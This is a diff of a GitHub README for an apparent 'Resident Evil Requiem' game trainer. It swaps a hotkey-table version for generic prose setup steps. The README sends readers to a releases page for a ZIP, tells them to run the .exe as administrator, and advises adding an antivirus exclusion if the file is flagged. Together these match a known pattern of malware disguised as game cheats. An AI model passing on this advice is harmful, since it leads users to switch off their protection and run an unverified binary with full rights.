@@ -1,99 +1,94 @@
+# 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Enhance your game experience with ease
 
-# Resident Evil Requiem Ultimate Trainer 2026
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases)
 
-## God Mode | Infinite Ammo | CP Editor | 42+ Features
+## Overview
 
-![Build](https://img.shields.io/badge/build-passing-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-424+-blue)
-![Version](https://img.shields.io/badge/version-v2.0-purple)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Undetected](https://img.shields.io/badge/undetected-100%25-success)
-![Keyless](https://img.shields.io/badge/keyless-YES!-orange)
+This software acts as a helper tool for Resident Evil Requiem. It allows you to change game settings during your play session. You gain control over character attributes and game mechanics. This tool provides access to health mods, inventory adjustments, and view settings. It serves players who want to adjust the challenge level or customize their visual experience. 
 
----
+The software runs alongside the game. It communicates with your system memory to apply changes in real time. You do not need to edit game files or perform complex installations.
 
-## Why This Trainer?
+## ⚙️ System Requirements
 
-Resident Evil Requiem brings us back to Raccoon City, but the terror doesn't have to be unbearable. This trainer gives you **42+ powerful functions** to customize your survival horror experience – from god mode to visual tweaks.
+Ensure your computer meets these standards before you run the software:
 
-| Feature | This Trainer | Others |
-|---------|--------------|--------|
-| **Free** | ✅ Forever | ❌ $5/month |
-| **42+ Features** | ✅ Yes | ❌ Limited |
-| **Overlay** | ✅ Yes | ❌ No |
-| **Keyless** | ✅ Yes | ❌ Links & ads |
-| **Offline** | ✅ Yes | ❌ Requires internet |
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 4 GB RAM minimum.
+* Storage: 50 MB of disk space.
+* Graphics: DirectX 12 compatible hardware.
+* Game: Resident Evil Requiem installed and updated to the latest version.
 
----
+## 🚀 How to Install and Start
 
-## Features
+Follow these steps to set up the tool on your Windows computer.
 
-### Combat
-| Hotkey | Function |
-|--------|----------|
-| F1 | Toggle Menu |
-| F2 | God Mode / Ignore Hits |
-| F3 | Infinite Health |
-| F4 | Infinite Ammo |
-| F5 | No Reload |
-| F6 | One-Hit Kill |
-| F7 | Super Accuracy |
-| F8 | Damage Multiplier |
+1.  Visit [this page](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases) to download the latest version.
+2.  Locate the downloaded ZIP file in your computer folders.
+3.  Right-click the ZIP file and select the Extract All option.
+4.  Choose a location for the files and finish the extraction.
+5.  Open the folder after extraction completes.
+6.  Double-click the .exe file to launch the interface.
 
-### Inventory & Progression
-| Hotkey | Function |
-|--------|----------|
-| F9 | Edit CP (Completion Points) |
-| F10 | Unlock All Special Content |
-| F11 | Set Item Stack to 999 |
-| F12 | Ignore Item Consumption |
+You should launch the game before or after the trainer starts. The software detects the game process automatically once you enter the main menu.
 
-### Visual & Movement
-| Hotkey | Function |
-|--------|----------|
-| Insert | Toggle REFramework Overlay |
-| PageUp | First-Person Mode |
-| PageDown | Third-Person Mode |
-| Home | Movement Speed Multiplier |
-| End | Freeze Enemies |
+## 🕹️ Available Features
 
-### Utility
-| Hotkey | Function |
-|--------|----------|
-| Numpad1 | Reset Save Count |
-| Numpad2 | Set Game Speed |
-| Numpad3 | Freeze Playtime (S+ Ranks) |
-| Numpad4 | Aimbot / Silent Aimbot |
+The trainer includes over 42 individual functions. You toggle these options using the interface provided in the app window.
 
-> All features work **offline** and do **not** modify game files – memory-only via REFramework.
+### Character Modification
+* God Mode: Prevents damage from enemies and traps.
+* Infinite Ammo: Removes the need to reload or collect bullets.
+* Stamina Fix: Allows infinite running and physical actions.
+* Inventory Editor: Grants access to rare items and upgrades.
 
----
+### Visual and Technical Adjustments
+* FOV Fix: Adjusts your field of view for wider situational awareness.
+* Speed Multiplier: Increases or decreases game movement speed.
+* Camera Control: Changes the third-person perspective to your preference.
+* Render Settings: Tweaks certain graphical outputs to improve game stability.
 
-## How to Install
+### Game Progression
+* CP Editor: Grants additional completion points for shop purchases.
+* Time Stopper: Pauses the internal game timer for specific missions.
+* Difficulty Modifier: Allows you to switch to easier modes during heavy combat.
 
-1. Go to **[Releases](../../releases)**
-2. Download `RE9_Trainer_Setup.zip` (password: `raccoon2026`)
-3. Extract and run `RE9_Trainer.exe` as Administrator
-4. Press **Insert** to open the trainer overlay in-game
+## 🛡️ Usage Instructions
 
-> Requires REFramework (included in the ZIP).
+Proper usage ensures the stability of your game. Follow these guidelines to avoid errors.
 
----
+1. Start Resident Evil Requiem.
+2. Launch the trainer from the extracted folder.
+3. Wait for the green status text to appear on the app. This means the trainer found the game memory.
+4. Select the features you want by clicking the boxes in the menu.
+5. Watch the game screen for confirmation messages.
+6. Close the trainer completely when you decide to exit the game.
 
-## System Requirements
+## 🔍 Frequently Asked Questions
 
-- Windows 10/11 (64-bit)
-- Resident Evil Requiem (Steam, Epic, or Xbox PC)
-- 4GB RAM minimum
+### Does this software save my settings?
+The trainer resets your choices when you close the program. You must select your preferred options each time you restart the session.
 
----
+### Can I use this in online modes?
+This software works for offline single-player content only. Using modifications in online environments often triggers security systems. Keep the trainer disabled if you plan to go online.
 
-## Legal Disclaimer
+### Why does my antivirus flag the file?
+Trainers interact with game memory. Some antivirus software views this as suspicious behavior. This is normal for this type of software. You may need to create an exclusion folder to prevent your antivirus from deleting the file.
 
-This tool is for **educational purposes** only. Use at your own risk. The developers are not responsible for any account actions.
+### How do I report a bug?
+If a feature does not activate, check the game version. Updates to the game often change memory addresses. This requires updates to the trainer. Check the download page for newer releases if the game updates.
 
----
+### Will the game crash if I use multiple features?
+Modern hardware handles these changes well. However, enabling conflicting settings can cause crashes. If the game closes suddenly, restart both the game and the trainer, then enable features one by one to find the source of the conflict.
 
-## Keywords
+### Do I need to be an administrator to run it?
+Run the application as an administrator to ensure it has the correct permissions to access the game process. Right-click the file and select Run as administrator.
 
-resident-evil-requiem, re9, trainer, god-mode, infinite-health, infinite-ammo, cp-editor, one-hit-kill, no-reload, fov-fix, unlock-all, reframework, cheat, utility, survival-horror, single-player, free, keyless, undetected, 2026, python, memory-editor, hotkeys, offline, portable
+## 📝 Guidelines for Use
+
+* Respect the game design. Use features to enjoy the story or overcome difficult sections.
+* Verify your game version matches the trainer version.
+* Keep the trainer updated.
+* Monitor your system temperatures while using game modifications.
+* Back up your game save files regularly before you use new tools. This protects your progress if a game update conflicts with memory modifications.
+
+The combination of the trainer and your game files requires no extra software or third-party libraries. Everything needed runs from the folder you extracted. If the trainer fails to connect, check that you have the latest version of the game. Older versions of Resident Evil Requiem will not align with the memory pointers used in the current trainer.
